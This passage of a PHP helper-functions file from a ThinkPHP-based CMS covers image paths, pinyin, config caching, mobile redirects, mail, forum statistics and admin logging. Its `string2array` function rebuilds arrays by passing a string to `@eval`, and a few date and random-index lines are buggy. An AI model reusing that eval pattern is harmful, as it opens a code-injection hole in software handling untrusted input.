    $height = $height == 0 ? '' : $height;
    if (!empty($str)) {
        $str = preg_replace('/!(\d+)X(\d+)\.' . $ext_dest . '$/i', '', $str); //清除缩略图的!200X200.jpg后缀

        $ext = explode('.', $str);
        $ext = end($ext);
    }
    if (empty($ext) || !in_array(strtolower($ext), array('jpg', 'gif', 'png', 'jpeg'))) {
        $str = '';
    }
    if (empty($str)) {
        $str = __ROOT__ . '/uploads/system/nopic.png';
        $ext = 'png';
        $ext_dest = 'png';
        $width = 0;
    }
    if ($width == 0) {
        return $str;
    }

    $rndstr = $rnd ? '?random=' . time() : '';
    return $str . '!' . $width . 'X' . $height . '.' . $ext_dest . $rndstr;
}

/**
 * 功能：计算文件大小
 * @param int $bytes
 * @return string 转换后的字符串
 */
function get_byte($bytes)
{
    if (empty($bytes)) {
        return '--';
    }
    $sizetext = array(" B", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB");
    return round($bytes / pow(1024, ($i = floor(log($bytes, 1024)))), 2) . $sizetext[$i];
}

/**
 * 获取拼音信息
 * @param string $str 字符串
 * @param int $ishead 是否为首字母
 * @param int $isclose 解析后是否释放资源
 * @param int $lang 语言
 * @return    string
 * 用法：$data['EnglishName'] = $this->get_pinyin(iconv('utf-8','gbk//ignore',$utfstr),0);
 */
function get_pinyin($str, $ishead = 0, $isclose = 1, $lang = 'zh-cn')
{
    //global $pinyins;
    $pinyins = array();
    $restr = '';
    $str = trim($str);
    $slen = strlen($str);
    //$str=iconv("UTF-8","gb2312",$str);
    //echo $str;
    if ($slen < 2) {
        return $str;
    }
    $file = './Data/pinyin-' . $lang . '.dat';
    if (!file_exists($file)) {
        $file = './Data/pinyin-zh-cn.dat';
    }
    if (count($pinyins) == 0) {
        $fp = fopen($file, 'r');
        if (false == $fp) {
            return '';
        }
        while (!feof($fp)) {
            $line = trim(fgets($fp));
            $pinyins[$line[0] . $line[1]] = substr($line, 3, strlen($line) - 3);
        }
        fclose($fp);
    }

    for ($i = 0; $i < $slen; $i++) {
        if (ord($str[$i]) > 0x80) {
            $c = $str[$i] . $str[$i + 1];
            $i++;
            if (isset($pinyins[$c])) {
                if ($ishead == 0) {
                    $restr .= $pinyins[$c];
                } else {
                    $restr .= $pinyins[$c][0];
                }
            } else {
                $restr .= "x"; //$restr .= "_";
            }
        } else if (preg_match("/[a-z0-9]/i", $str[$i])) {
            $restr .= $str[$i];
        } else {
            $restr .= "x"; //$restr .= "_";
        }
    }
    if ($isclose == 0) {
        unset($pinyins);
    }
    return $restr;
}

/*
 * 获取模板地址
 * @param string $tpl 模板文件名
 * @param string $style 样式
 * @return string
 */
function get_tpl($tpl = '', $style = '')
{
    $tplPath = './Tpl/' . MODULE_NAME . '/';
    $tplPath .= empty($style) ? C('CFG_DEFAULT_TPL') . '/' : $style . '/';
    if (trim($tpl) == '') {
        $tplPath .= CONTROLLER_NAME . C('TMPL_FILE_DEPR') . ACTION_NAME . C('TMPL_TEMPLATE_SUFFIX');
    } elseif (strpos($tpl, '.') > 0) {
        $tplPath .= $tpl;
    } else {
        $tplPath .= $tpl . C('TMPL_TEMPLATE_SUFFIX');
    }

    return $tplPath;
}

//获取手机模板
function get_mtpl($tpl = '', $style = '')
{
    $tplPath = './Tpl/' . MODULE_NAME . '/';
    $tplPath .= empty($style) ? C('CFG_DEFAULT_MOBILE_TPL') . '/' : $style . '/';
    if (trim($tpl) == '') {
        $tplPath .= CONTROLLER_NAME . C('TMPL_FILE_DEPR') . ACTION_NAME . C('TMPL_TEMPLATE_SUFFIX');
    } elseif (strpos($tpl, '.') > 0) {
        $tplPath .= $tpl;
    } else {
        $tplPath .= $tpl . C('TMPL_TEMPLATE_SUFFIX');
    }
    return $tplPath;
}

/**
 * 返回数据元值表(Key-Value)
 * @param string|integer $key 标识名
 * @return mixed
 */
function get_meta_value($key)
{
    $sname = 'config/meta';
    if ($key == '') {
        return '';
    }
    $array = F($sname);
    if (!$array) {
        $data = M('meta')->field('name,value')->select();
        $array = array();
        if ($data) {
            foreach ($data as $value) {
                $array[$value['name']] = $value['value'];
            }
        }

        //静态缓存规则
        $html_cache_rules = array();
        if (isset($array['HTML_CACHE_INDEX_ON']) && $array['HTML_CACHE_INDEX_ON'] == 1) {
            $html_cache_rules['index:index'] = array('{:module}/Index_{:action}', intval($array['HTML_CACHE_INDEX_TIME']));
        }
        if (isset($array['HTML_CACHE_LIST_ON']) && $array['HTML_CACHE_LIST_ON'] == 1) {
            $html_cache_rules['list:index'] = array('{:module}/List/{:action}_{e}{cid|intval}_{p|intval}', intval($array['HTML_CACHE_LIST_TIME']));
        }
        if (isset($array['HTML_CACHE_SHOW_ON']) && $array['HTML_CACHE_SHOW_ON'] == 1) {
            $html_cache_rules['show:index'] = array('{:module}/Show/{:action}_{e}{cid|intval}_{id|intval}_{p|intval}', intval($array['HTML_CACHE_SHOW_TIME']));
        }
        if (isset($array['HTML_CACHE_SPECIAL_ON']) && $array['HTML_CACHE_SPECIAL_ON'] == 1) {
            $html_cache_rules['special:index'] = array('{:module}/Special/{:action}_{cid|intval}_{p|intval}', intval($array['HTML_CACHE_SPECIAL_TIME'])); //首页
            $html_cache_rules['special:shows'] = array('{:module}/Special/{:action}_{id|intval}', intval($array['HTML_CACHE_SPECIAL_TIME'])); //页面
        }
        $array['HTML_CACHE_RULES_COMMON'] = $html_cache_rules; //公共静态缓存规则

        //路由
        $tmp = explode("\n", str_replace(array("\r\n", "\t"), array("\n", ""), trim($array['HOME_URL_ROUTE_RULES'], "\r\n")));

        $url_route_rules = array();
        foreach ($tmp as $v) {
            $temparr = explode('=>', $v);
            if (empty($temparr[0]) || empty($temparr[1])) {
                continue;
            }
            $url_route_rules[$temparr[0]] = $temparr[1];
        }
        $array['HOME_URL_ROUTE_RULES'] = $url_route_rules; //公共静态缓存规则

        F($sname, $array);
    }

    $value = isset($array[$key]) ? $array[$key] : '';
    return $value;

}

/**
 * 返回配置项数组或对应值(快速缓存)
 * @param string|integer $key 标识名,标识为空则返回所有配置项数组
 * @param string|integer $name 缓存名称
 * @return mixed
 */
function get_cfg_value($key = '', $name = 'site')
{
    if (empty($name)) {
        return array();
    }
    $sname = 'config/' . $name;
    $array = F($sname);
    if (!$array) {
        $data = M('config')->field('name,value,typeid')->select();
        $array = array();
        if ($data) {
            foreach ($data as $value) {
                $array[$value['name']] = $value['value'];
            }
        }
        F($sname, $array);
    }
    if ($key == '') {
        return $array;
    } else {
        $value = isset($array[$key]) ? $array[$key] : '';
        return $value;
    }

}

/**
 * 获取文件storage访问地址(SAE)
 * @param string $domain 域名名称
 * @param string $filename 文件名称(路径)
 * @return string
 */
function get_sae_storage_url($domain = 'uploads', $filename = '')
{
    if (empty($domain)) {
        return '';
    }

    static $_storage = array();
    $name = $domain . ':' . $filename;
    if (isset($_storage[$name])) {
        return $_storage[$name];
    }
    $storage = new \SaeStorage();
    $file_url = $storage->getUrl($domain, $filename);
    $_storage[$name] = $filename;
    return $file_url;
}

/**
 * 返回从根目录开始的地址
 * @param string $path 子目录地址
 * @param boolean $domain 是否显示域名
 * @param string $path_root 网站根目录地址
 * @return mixed
 */
function get_url_path($path, $domain = false, $path_root = __ROOT__)
{

    $baseurl = ''; //域名地址
    if ($domain) {
        if (!empty($_SERVER['HTTP_HOST'])) {
            $baseurl = 'http://' . $_SERVER['HTTP_HOST'];
        } else {
            $baseurl = rtrim("http://" . $_SERVER['SERVER_NAME'], '/');
        }

    }

    $path_sub = explode('/', $path);

    if ($path_sub[0] == '') {
        $baseurl = $baseurl . implode('/', $path_sub);
    } elseif (empty($path_root)) {
        foreach ($path_sub as $k => $v) {
            if ($v == '.' || $v == '..') {
                unset($path_sub[$k]);
            }
        }
        $baseurl .= '/' . implode('/', $path_sub);
    } else {
        $path_root_tmp = explode('/', $path_root);
        $path_root_count = count($path_root_tmp);
        foreach ($path_sub as $k => $v) {
            if ($v == '.') {
                unset($path_sub[$k]);
            }
            if ($v == '..') {
                if ($path_root_count > 0) {
                    unset($path_root_tmp[$path_root_count - 1]);
                    --$path_root_count;
                }
                unset($path_sub[$k]);
            }
        }
        $baseurl .= implode('/', $path_root_tmp) . '/' . implode('/', $path_sub);
    }
    $baseurl = rtrim($baseurl, '/') . '/';
    return $baseurl;
}

/**
 * 图片字符串 转图片数组
 */
function get_picture_array($str_pictureurls)
{
    $pictureurls_arr = empty($str_pictureurls) ? array() : explode('|||', $str_pictureurls);

    $pictureurls = array();
    foreach ($pictureurls_arr as $v) {
        $temp_arr = explode('$$$', $v);
        if (!empty($temp_arr[0])) {
            $pictureurls[] = array(
                'url' => $temp_arr[0],
                'alt' => $temp_arr[1],
            );
        }
    }
    return $pictureurls;
}

/**
 * 检测验证码
 */
function check_verify($code, $id = 1)
{
    $verify = new \Think\Verify();
    return $verify->check($code, $id);
}

/**goto mobile*/
/*function go_mobile()
{
    $mobileAuto = C('CFG_MOBILE_AUTO');
    if ($mobileAuto == 1) {
        $wap2web = I('wap2web', 0, 'intval'); //手机访问电脑版
        $agent   = $_SERVER['HTTP_USER_AGENT'];
        if ($wap2web != 1) {
            if (strpos($agent, "comFront") || strpos($agent, "iPhone") || strpos($agent, "MIDP-2.0") || strpos($agent, "Opera Mini") || strpos($agent, "UCWEB") || strpos($agent, "Android") || strpos($agent, "Windows Phone") || strpos($agent, "Windows CE") || strpos($agent, "SymbianOS")) {
                header('Location:' . U('Mobile/Index/index') . '');
            }
        }
    }

}*/

function go_mobile()
{
    $mobileAuto = C('CFG_MOBILE_AUTO');
    if ($mobileAuto == 1) {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
        $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|mobile|iphone|android|ios|comFront|MIDP-2.0|Opera Mini|Windows Phone|Windows CE|SymbianOS)/i";
        //if(($ua == '' || preg_match($uachar, $ua))&& !strpos(strtolower($_SERVER['REQUEST_URI']),'mobile'))
        //if((preg_match($uachar, $ua))&& !strpos(strtolower($_SERVER['REQUEST_URI']),'mobile'))
        if (preg_match($uachar, $ua)) {
            if (C('APP_SUB_DOMAIN_DEPLOY')) {
                $Loaction = C('CFG_MWEBURL') . $_SERVER['REQUEST_URI'];
            } else {
                $Loaction = '/Mobile' . $_SERVER['REQUEST_URI'];
            }
            //$Loaction = 'http://g.ichang8.com'.$_SERVER['REQUEST_URI'];
            if (!empty($Loaction)) {
                header('HTTP/1.1 301 Moved Permanently');
                header("Location: $Loaction");
                exit;
            }

        }
    }

}

function go_pc()
{
    $mobileAuto = C('CFG_MOBILE_AUTO');

    if ($mobileAuto == 1) {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
        $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|mobile|iphone|android|ios|comFront|MIDP-2.0|Opera Mini|Windows Phone|Windows CE|SymbianOS)/i";
        if (!preg_match($uachar, $ua)) {
            $Loaction = C('CFG_WEBURL') . $_SERVER['REQUEST_URI'];
            if (!empty($Loaction)) {
                header('HTTP/1.1 301 Moved Permanently');
                header("Location: $Loaction");
                exit;
            }

        }
    }

}

/**
 * 转换网址
 * @param string $weburl 网址或者U方法的参数
 * @param boolean $rnd 是否添加随机数
 * @param boolean $flag 是否转换index.php
 * @return string
 */
function go_link($weburl = 'http://www.ichang8.com/', $rnd = 0, $flag = 1)
{
    if (strpos($weburl, 'http://') === 0 || strpos($weburl, 'https://') === 0 || strpos($weburl, 'ftp://') === 0) {
        $weburl = U(C('DEFAULT_MODULE') . '/Go/link', array('url' => base64_encode($weburl)));
    } else {
        $weburl = U($weburl);
    }
    if ($flag) {
        $search = $_SERVER['SCRIPT_NAME']; //$_SERVER['PHP_SELF'];
        $replace = rtrim(dirname($search), "\\/") . '/index.php';
        $weburl = str_replace($search, $replace, $weburl);
    }
    //随机数
    if ($rnd) {
        $weburl .= '#' . rand(1000, time());
    }

    return $weburl;
}

if (!function_exists('apache_request_headers')) {
    /**
     * 获取头部信息
     * @return array
     * User: hjun
     * Date: 2019-05-06 14:57:23
     * Update: 2019-05-06 14:57:23
     * Version: 1.00
     */
    function apache_request_headers()
    {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

/**
 * D2是D方法的扩展20140919
 * D2函数用于实例化Model 格式 项目://分组/模块
 * @param string $name Model资源地址
 * @param string $tableName 数据表名
 * @param string $layer 业务层名称
 * @return Model
 */
function D2($name = '', $tableName = '', $layer = '')
{
    if (empty($name)) {
        return new \Think\Model;
    }

    static $_model = array();
    $layer = $layer ?: C('DEFAULT_M_LAYER');
    if (isset($_model[$name . $layer . '\\' . $tableName])) {
        return $_model[$name . $layer . '\\' . $tableName];
    }

    $class = parse_res_name($name, $layer);
    if (class_exists($class)) {
        //$model      =   new $class(basename($name));
        $model = empty($tableName) ? new $class(basename($name)) : new $class(basename($tableName), $tableName);
    } elseif (false === strpos($name, '/')) {
        // 自动加载公共模块下面的模型
        if (!C('APP_USE_NAMESPACE')) {
            import('Common/' . $layer . '/' . $class);
        } else {
            $class = '\\Common\\' . $layer . '\\' . $name . $layer;
        }
        $model = class_exists($class) ? (empty($tableName) ? new $class(basename($name)) : new $class(basename($tableName), $tableName)) : new Think\Model($name);
    } else {
        Think\Log::record('D方法实例化没找到模型类' . $class, Think\Log::NOTICE);
        $model = new \Think\Model(basename($name));
    }
    $_model[$name . $layer . '\\' . $tableName] = $model;
    return $model;
}

/**
 * 提示信息
 * @param string $msg 提示内容
 * @param string $title 标题
 * @return void
 */
function exit_msg($msg = '', $title = '提示')
{
    $msg = nl2br($msg);
    $str = <<<str
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'/>
<title>{$title}</title>
<style type="text/css">
body{background:#fff;font-family: 'Microsoft YaHei'; color: #333;}
.info{width:90%;font-size:100%; line-height:150%; margin:20px auto; padding:10px;border:solid 1px #ccc;}
</style>
</head>
<body>
<div class="info">{$msg}</div>
</body>
</html>
str;
    echo $str;
    exit();
}

/**
 *发送邮件
 * @param string $address 地址
 * @param string $title 标题
 * @param string $message 邮件内容
 * @param string $attachment 附件列表
 * @return   boolean
 */
function send_mail($address, $title, $message, $attachment = null)
{
    Vendor('PHPMailer.class#phpmailer');

    $mail = new PHPMailer;
    //$mail->Priority = 3;
    // 设置PHPMailer使用SMTP服务器发送Email
    $mail->IsSMTP();
    // 设置邮件的字符编码，若不指定，则为'UTF-8'
    $mail->CharSet = 'UTF-8';
    $mail->SMTPDebug = 0; // 关闭SMTP调试功能
    $mail->SMTPAuth = true; // 启用 SMTP 验证功能
    // $mail->SMTPSecure = 'ssl';  // 使用安全协议
    $mail->IsHTML(true); //body is html

    // 设置SMTP服务器。
    $mail->Host = C('CFG_EMAIL_HOST');
    $mail->Port = C('CFG_EMAIL_PORT') ? C('CFG_EMAIL_PORT') : 25; // SMTP服务器的端口号

    // 设置用户名和密码。
    $mail->Username = C('CFG_EMAIL_LOGINNAME');
    $mail->Password = C('CFG_EMAIL_PASSWORD');

    // 设置邮件头的From字段
    $mail->From = C('CFG_EMAIL_FROM');
    // 设置发件人名字
    $mail->FromName = C('CFG_EMAIL_FROM_NAME');

    // 设置邮件标题
    $mail->Subject = $title;
    // 添加收件人地址，可以多次使用来添加多个收件人
    $mail->AddAddress($address);
    // 设置邮件正文
    $mail->Body = $message;
    // 添加附件
    if (is_array($attachment)) {
        foreach ($attachment as $file) {
            is_file($file) && $mail->AddAttachment($file);
        }
    }

    // 发送邮件。
    //return($mail->Send());
    return $mail->Send() ? true : $mail->ErrorInfo;
}

function check_date($str, $format = "Y-m-d")
{
    $unixTime_1 = strtotime($str); //strtotime 成功则返回时间戳，否则返回 FALSE。在 PHP 5.1.0 之前本函数在失败时返回 -1
    if (!is_numeric($unixTime_1) || $unixTime_1 == -1) {
        return false;
    }

    $checkDate = date($format, $unixTime_1);
    $unixTime_2 = strtotime($checkDate);
    if ($unixTime_1 == $unixTime_2) {
        return true;
    } else {
        return false;
    }
}

/**
 *将字符串转换为数组
 * @param string $data 字符串
 */
function string2array($data)
{
    if ($data == '') {
        return array();
    }

    @eval("\$array = $data;");
    return $array;
}

/**
 *将数组转换为字符串
 * @param array $data 数组
 * @param bool $isformdata 如果为0，则不使用new_stripslashes处理，可选参数，默
 */
function array2string($data, $isformdata = 1)
{
    if ($data == '') {
        return '';
    }

    if ($isformdata) {
        $data = new_stripslashes($data);
    }

    return addslashes(var_export($data, true));
}

function new_stripslashes($string)
{
    if (!is_array($string)) {
        return stripslashes($string);
    }

    foreach ($string as $key => $val) {
        $string[$key] = new_stripslashes($val);
    }

    return $string;

}

function get_username($userid = 0)
{
    $user_name = '';
    if ($userid > 0) {
        $map['id'] = $userid;
        $rs = M('member')->field('username')->where($map)->find();
        $user_name = $rs['username'];
    } else {
        $user_name = '管理员';
    }

    return $user_name;
}


/*检查复选框是否被选中*/
function is_checked($str = '', $id = 0)
{
    if (empty($str) || empty($id)) {
        return false;
    }

    $arry = explode(",", $str);

    if (is_array($arry)) {
        $res = in_array($id, $arry);
    } else {
        if ($arry == $id) {
            $res = true;
        } else {
            $res = false;
        }
    }

    return $res;
}

//获取栏目属性
function get_catProperty($id = 0)
{
    if ($id) {
        $map['id'] = $id;
        $property = D('CategoryView')->where($map)->getField('property');
    } else {
        $property = '';
    }
    return $property;
}

//获取属性名称
function get_property($id = 0)
{
    $propname = '';
    if ($id) {
        $map['id'] = $id;
        $list = M('Property')->where($map)->find();
        $propname = $list['name'];
    }
    return $propname;
}

//获取属性值
function get_propvalue($id = 0)
{
    $valuelist = '';
    if ($id) {
        $map['prop_id'] = $id;
        $valuelist = M('PropertyValue')->where($map)->select();
    }
    return $valuelist;
}

function get_user()
{
    $uid = intval(get_cookie('uid'));
    $res = '';
    if ($uid > 0) {
        $user = D('MemberView')->nofield('password,encrypt')->find($uid);
        if ($user) {
            $res = $user;
        }
    }
    return $res;
}


//添加内容时自动给图片增加alt和title
function imgalt($title, $value)
{
    $htmls = $value;

    //给图片添加alt标签
    $pattern = "/(<img(?![^<>]*?alt=[^<>]*?>))(.*?>)/is";
    $replacement = "\$1 alt='" . $title . "'\$2";
    $htmls = preg_replace($pattern, $replacement, $htmls);

    //给图片添加title标签
    $pattern1 = "/(<img(?![^<>]*?title=[^<>]*?>))(.*?>)/is";
    $replacement1 = "\$1 title='" . $title . "'\$2";
    $htmls = preg_replace($pattern1, $replacement1, $htmls);

    return $htmls;
}

//获取当前栏目包含的帖子数量
function get_forumcat($cid = 0)
{
    $count = 0;
    if ($cid > 0) {
        $map['cid'] = $cid;
        $map['status'] = 1;
        $count = M('Forum')->where($map)->count();
    }
    return $count;
}

//获取当前栏目包含的回复数量
function get_forumcat_rnum($cid = 0)
{
    $count = 0;
    if ($cid > 0) {
        $map['cid'] = $cid;
        $count = M('ForumReply')->where($map)->count();
    }
    return $count;
}

//通过帖子id获取论坛回复数量
function get_forumcat_reply($postid = 0)
{
    $count = 0;
    if ($postid > 0) {
        $map['postid'] = $postid;
        $count = M('ForumReply')->where($map)->count();
    }
    return $count;
}

//通过栏目id获取论坛最后一条回复
function get_forumcat_rinfo($cid = 0)
{
    //$content = '';
    $list = array();
    if ($cid > 0) {
        $map['cid'] = $cid;
        $list = D('ForumReplyView')->where($map)->order('id desc')->find();
    }
    return $list;
}

//获取论坛回复数量
function get_forum_reply($id = 0)
{
    $count = 0;
    if ($id > 0) {
        $map['postid'] = $id;
        $count = M('ForumReply')->where($map)->count();
    }
    return $count;
}

//获取论坛最后一条回复
function get_forum_rinfo($id = 0, $mid = 0)
{
    //$content = '';
    $list = array();
    if ($id > 0 && $mid > 0) {
        $map['postid'] = $id;
        $map['modelid'] = $mid;
        $list = D('ForumReplyView')->where($map)->order('id desc')->find();
    }

    return $list;
}

function format_date($time)
{
    if ($time > 0) {
        $t = time() - $time;
        $f = array(
            '31536000' => '年',
            '2592000' => '个月',
            '604800' => '星期',
            '86400' => '天',
            '3600' => '小时',
            '60' => '分钟',
            '1' => '秒'
        );
        foreach ($f as $k => $v) {
            if (0 != $c = floor($t / (int)$k)) {
                return $c . ' ' . $v . '前';
            }
        }
    } else {
        return '暂无内容';
    }
}

//统计论坛帖子数量
function forum_num($type = 0, $cid = 0)
{
    $map = array();
    if ($cid > 0) {
        $map['cid'] = $cid;
    }
    switch ($type) {
        case 1:
            //获取今日开始时间戳和结束时间戳
            $today_start = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
            $today_end = mktime(0, 0, 0, date('m'), date('d') + 1, date('Y')) - 1;
            $map['publishtime'] = array(array('egt', $today_start), array('elt', $today_end));
            $count = M('Forum')->where($map)->count();
            return $count;
            break;
        case 2:
            //获取昨日起始时间戳和结束时间戳
            $yesterday_start = mktime(0, 0, 0, date('m'), date('d') - 1, date('Y'));
            $yesterday_end = mktime(0, 0, 0, date('m'), date('d'), date('Y')) - 1;
            $map['publishtime'] = array(array('egt', $yesterday_start), array('elt', $yesterday_end));
            //dump($map);
            $count = M('Forum')->where($map)->count();
            return $count;
            break;
        case 3:
            //获取上周起始时间戳和结束时间戳
            $lastweek_start = mktime(0, 0, 0, date('m'), date('d') - date('w') + 1 - 7, date('Y'));
            $lastweek_end = mktime(23, 59, 59, date('m'), date('d') - date('w') + 7 - 7, date('Y'));
            $map['publishtime'] = array(array('egt', $lastweek_start), array('elt', $lastweek_end));
            $count = M('Forum')->where($map)->count();
            return $count;
            break;
        case 4:
            //获取本周周起始时间戳和结束时间戳
            $thisweek_start = mktime(0, 0, 0, date('m'), date('d') - date('w' + 1), date('Y'));
            $thisweek_end = mktime(23, 59, 59, date('m'), date('d') - date('w') + 7, date('Y'));
            $map['publishtime'] = array(array('egt', $thisweek_start), array('elt', $thisweek_end));
            $count = M('Forum')->where($map)->count();
            return $count;
            break;
        case 5:
            //获取本月起始时间戳和结束时间戳
            $thismonth_start = mktime(0, 0, 0, date('m'), 1, date('Y'));
            $thismonth_end = mktime(23, 59, 59, date('m'), date('t'), date('Y'));
            $map['publishtime'] = array(array('egt', $thismonth_start), array('elt', $thismonth_end));
            $count = M('Forum')->where($map)->count();
            return $count;
            break;
        default:
            $count = M('Forum')->where($map)->count();
            return $count;
    }
}

//获取会员总数
function get_user_num()
{
    $count = M('member')->count();
    return $count;
}

//获取最新加入的会员
function get_user_one()
{
    $user = D('MemberView')->nofield('password,encrypt')->order('id desc')->find();
    return $user;
}

//获取会员列表
function get_userlist($num = 5)
{
    $ulist = D('MemberView')->nofield('password,encrypt')->order('id desc')->limit($num)->select();
    return $ulist;
}

/**
 * 返回自定义属性名称|值列表
 * @param integer $flag 自定义属性值
 * @param string $delimiter 分割符
 * @param boolean $iskey 是否返回key
 * @param boolean $isarray 是否返回数组
 * @return array|string
 */
//返回
function flagtag($flag, $delimiter = ' ', $iskey = false, $isarray = false)
{
    if (empty($flag)) {
        return $isarray ? array() : '';
    }
    $flagStr = array();
    $flagtype = get_item('flagtype');//文档属性
    foreach ($flagtype as $k => $v) {
        if ($flag & $k) {
            $flagStr[] = $iskey ? $k : $v;
        }
    }
    if ($isarray) {
        return $flagStr;
    } else {
        return implode($delimiter, $flagStr);
    }

}

//获取头像
function get_face($uid = 0)
{
    $face = '';
    if ($uid > 0) {
        $map['id'] = $uid;
        $face = M('Member')->where($map)->getField('face');
    }
    if (!$face) {
        $face = __ROOT__ . '/avatar/system/0.gif';
    }
    return $face;
}

//获取当前栏目包含的文章数量
function get_artcount($cid = 0, $mid = 0)
{
    $count = 0;
    if ($cid > 0 && $mid > 0) {
        $tablename = M('model')->where("id=" . $mid)->getField('tablename');
        $ids = \Common\Lib\Category::getChildsId(get_category(), $cid, true);
        $map['cid'] = array('in', $ids);
        $map['status'] = 1;
        $count = M($tablename)->where($map)->count();
    }
    return $count;
}

/**
 *模板随机色;
 * @return str 颜色值
 */
function strcolor()
{
    $MUsicColor = array();
    array_push($MUsicColor, "009900");
    array_push($MUsicColor, "0099CC");
    array_push($MUsicColor, "00CC66");
    array_push($MUsicColor, "6600FF");
    array_push($MUsicColor, "66CCFF");
    array_push($MUsicColor, "990099");
    array_push($MUsicColor, "CC0099");
    array_push($MUsicColor, "FF0066");
    array_push($MUsicColor, "FF9933");
    array_push($MUsicColor, "FF0066");
    array_push($MUsicColor, "9933FF");
    $key = rand(0, 11);
    return '#' . $MUsicColor[$key];
}

//获取收藏数量
function get_collectnum($tid = 0, $mid = 0)
{
    $count = 0;
    if ($tid > 0 && $mid > 0) {
        $map['tid'] = $tid;
        $map['mid'] = $mid;
        $count = M('collects')->where($map)->count();
    }
    return $count;
}

//获取热门标签
function get_tags($typeid = 0, $limit = 10)
{
    if ($typeid > 0) {
        $map['typeid'] = $typeid;
        $tags = M('tag')->where($map)->order('tag_click DESC')->limit($limit)->select();
    } else {
        $tags = M('tag')->order('tag_click DESC')->limit($limit)->select();
    }
    return $tags;
}

function isdomain($url)
{
    if (!$url) {
        return false;
    }
    if (strpos($url, 'http') !== false || strpos($url, 'https') !== false || strpos($url, 'ftp') !== false) {
        return true;
    } else {
        return false;
    }
}

function save_tags($keywords, $cid, $actionName)
{
    if ($keywords) {
        $tags = trim(str_replace('，', ',', $keywords));
        $tags = explode(',', $keywords);
        $tagcount = count($tags);
        if ($tagcount > 0) {
            foreach ($tags as $k => $val) {
                $tagname = trim($val);
                if ($tagname) {
                    $mp['tag_name'] = $tagname;
                    $rs = M('tag')->where($mp)->find();
                    if (!$rs) {
                        $r['tag_name'] = $tagname;
                        $r['typeid'] = $cid;
                        $r['tag_sort'] = 1;
                        $r['tag_status'] = 1;
                        $r['posttime'] = time();
                        $r['tag_click'] = 1;
                        $r['tablename'] = $actionName;
                        M('tag')->add($r);
                    }
                }
            }
        }
    }
}

/**
 * hjun 2018-03-26 04:00:22
 * 将数组重新排序一下 主要目的是让key值从0开始
 * @param array $arr
 * @return array ['code'=>200, 'msg'=>'', 'data'=>null]
 * User: hjun
 * Date: 2018-03-26 04:00:19
 * Update: 2018-03-26 04:00:19
 * Version: 1.00
 */
function refreshArr($arr = [])
{
    $list = [];
    foreach ($arr as $value) {
        if (!empty($value['child'])) {
            $value['child'] = refreshArr($value['child']);
        }
        $list[] = $value;
    }
    return $list;
}

/**
 * 记录后台管理员日志
 * @param array $admin 管理员
 * @param string $desc 描述
 * @param int $contractId 合同ID 用于记录合同退租的记录
 * User: hjun
 * Date: 2018-01-06 11:35:12
 * Update: 2018-01-06 11:35:12
 * Version: 1.00
 */
function addAdminLog($admin = [], $desc = '', $contractId = 0)
{
    $data = array();
    $data['admin_id'] = $admin['id'];
    $data['admin_name'] = $admin['username'];
    $data['admin_type'] = $admin['usertype'];
    $data['mall_id'] = $admin['mall_id'];
    $data['desc'] = $desc;
    $data['create_time'] = NOW_TIME;
    $data['module'] = strtolower(MODULE_NAME);
    $data['controller'] = strtolower(CONTROLLER_NAME);
    $data['action'] = strtolower(ACTION_NAME);
    $post = empty($_POST) ? @file_get_contents("php://input") : json_encode($_POST, 256);
    $data['param'] = empty($post) ? '' : $post;
    $data['ip'] = get_client_ip(0, true);
    $header = apache_request_headers();
    $data['header'] = jsonEncode($header);
    $data['contract_id'] = $contractId;
    $model = M('admin_log');
    $model->add($data);
}

/**
 * 记录后台管理员日志
 * @param int $adminId 管理员ID
 * @param int $device 登录设备
 * User: hjun
 * Date: 2018-01-06 11:35:12
 * Update: 2018-01-06 11:35:12
 * Version: 1.00
 */
function addAdminLoginLog($adminId = 0, $device = DEVICE_PC)
{
    $data = array();
    $data['admin_id'] = $adminId;
    $data['device'] = $device;
    switch ($device) {
        case DEVICE_PC:
            $from = 1;
            break;
        case DEVICE_ANDROID:
        case DEVICE_IOS:
            $from = 2;
            break;
    }
    $data['from'] = $from;
    $data['create_time'] = NOW_TIME;
    $data['ip'] = get_client_ip(0, true);
    $model = M('admin_login_log');
    $model->add($data);
}

/**
 * 返回规范结构.
 * @param int $code 状态码
 * @param string $msg 信息
 * @param array $data 数据
 * @return array
 * @author: hjun
 * @created: 2017-06-22 13:57:37
 * @version: 1.0
 */
function getReturn($code = CODE_ERROR, $msg = null, $data = [])
{
    $msg = !isset($msg) ? '系统繁忙,请稍候重试...' : $msg;
    return array('time' => '', 'code' => $code, 'msg' => $msg, 'data' => $data);
}

/**
 * 记录日志
 * 默认是信息等级
 * @param string $message
 * @param string $level
 * @param string $method
 * @param boolean $record
 * @param string $type
 * @param string $path
 * User: hj
 * Date: 2017-09-14 00:40:00
 */
function logWrite($message = '', $level = 'INFO', $method = 'record', $record = false, $type = '', $path = '')
{
    switch ($method) {
        case 'write':
            if (empty($path)) {
                $path = C('LOG_PATH');
            }
            \Think\Log::write($message, $level, $type, $path . date('y_m_d') . '.log');
            break;
        default:
            \Think\Log::record($message, $level, $record);
            break;
    }
}

/**
 * 自动扣款相关日志记录
 * @param string $message
 * @param string $level
 * @return null
 * User: hjun
 * Date: 2019-07-12 12:00:57
 * Update: 2019-07-12 12:00:57
 * Version: 1.00
 */
function autoPayLogWrite($message = '', $level = 'INFO')
{
    logWrite($message, $level, 'write', false, '', AUTO_PAY_LOG);
}

/**
 * CURL请求
 * @param string $url 请求url地址
 * @param string $method 请求方法 get post
 * @param array $postfields post数据数组
 * @param array $headers 请求header信息
 * @param bool|false $debug 调试开启 默认false
 * @return mixed
 */
function httpRequest($url = '', $method = 'GET', $postfields = null, $headers = array(), $debug = false)
{
    $count = 0;
    do {
        $method = strtoupper($method);
